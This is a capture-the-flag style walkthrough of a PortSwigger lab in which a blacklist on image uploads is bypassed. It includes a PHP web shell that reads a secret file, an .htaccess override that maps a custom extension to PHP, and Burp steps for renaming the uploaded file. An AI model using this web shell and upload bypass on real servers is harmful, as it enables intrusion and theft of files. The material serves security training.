# Lab : Web shell upload via extension blacklist bypass
[**Click here to enter the Lab**](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

## Lab Description

This lab contains a vulnerable image upload function. The server attempts to protect against malicious file uploads by blacklisting certain dangerous file extensions such as `.php`. However, this defense mechanism is flawed due to **incomplete or misconfigured blacklisting**, which allows attackers to bypass the restriction using alternative extensions that are still executable by the server.

This misconfiguration creates a security gap where an attacker can upload a **PHP web shell** using a lesser-known executable extension (e.g., `.php5`, `.phtml`, or other bypass variants). Once the shell is successfully uploaded and executed, the attacker can interact with the server remotely.

> **Hint**: To successfully exploit this lab, you will need to upload **two different files** as part of your strategy. One might act as a helper or a way to bypass the blacklist logic.

Your goal in this lab is to:

- Upload a basic PHP web shell using a bypassed extension.
- Access and execute the web shell to issue commands.
- Use the shell to read the contents of the file located at `/home/carlos/secret` on the server.
- Submit the secret using the submission button in the lab banner to complete the lab.

You can log in to your own account using the following credentials:  
- **Username:** `wiener`  
- **Password:** `peter`

---

## Solution 

- At first login with credentials `wiener` , `peter` .
- Then go to image upload functionality on **My Account** page .
  
   ![image](https://github.com/user-attachments/assets/8b1f6754-9862-4f3b-a986-23ac932fdca2)

- At previous labs we write a simple web shell in a file and named it `SimpleShell.php` that's content is :
  
```php
<?php
echo "<pre>";
echo file_get_contents("/home/carlos/secret");
echo "</pre>";
?>
```

it's role is to print content of `/home/carlos/secret` 

- Now upload this file using **Image upload** functionality.Observe we got an error :
  
![p](https://github.com/user-attachments/assets/ddc10293-3849-49eb-8572-5ca5c78cfbc6)

To resolve this issue we need to override the `.htaccess` file to allow PHP files for uploading.

> The **.htaccess** A file is a configuration file used in the Apache HTTP Server to manage server settings for the directory and its subdirectories. It allows for directory-level configuration without altering the main Apache configuration files.

- Create a file with this name ( `.htaccess` ) and add in it this content :
  
```
AddType application/x-httpd-php .any-custom-file-extension
```

```
# Example : 
 AddType application/x-httpd-php .xyz
 or
 AddType application/x-httpd-php .123
 or
 AddType application/x-httpd-php .abc
```

- Imagene we choosed this :

```
 AddType application/x-httpd-php .123
```

- After make the `.htaccess` file , Upload it using the image upload functionality. Observe our file is uploaded successfully.

![e](https://github.com/user-attachments/assets/b66057a3-f3c6-4ad2-b075-2778d263b98e)

Now move back to burp suite under HTTP history find POST /my-account/avatar request and send it to the Repeater tab and replace the filename parameter from your-filename.php to your-filename.your-custom-extension which you have mentioned in the .htaccess file. In my case, I have mentioned .123 as my custom extension. 

> So I will change SimpleShell.php to SimpleShell.123

Send the request and observe our file is uploaded successfully.

- Before edit file name extension :

  ![x](https://github.com/user-attachments/assets/c0d552ac-8079-4c68-b0ca-9c967e86c329)

- After edit file name extension :

  ![z](https://github.com/user-attachments/assets/5873cb48-949f-4861-81fe-e10b37342631)
  

In the browser reload the My Account page and in the burp suite under HTTP history find GET /files/avatar/SimpleShell.123 request, observe its response we got user carlos secret.

![pa](https://github.com/user-attachments/assets/d538ffc4-8b52-4572-87a1-d68a326da6d1)

- Now Copy the secret and submit it in the browser to solve the lab successfully…

![p](https://github.com/user-attachments/assets/f42c8121-e79e-4732-b03a-733efc2de576)

![PM](https://github.com/user-attachments/assets/76a64ece-ec77-42fa-bd64-d5cc01b47de6)

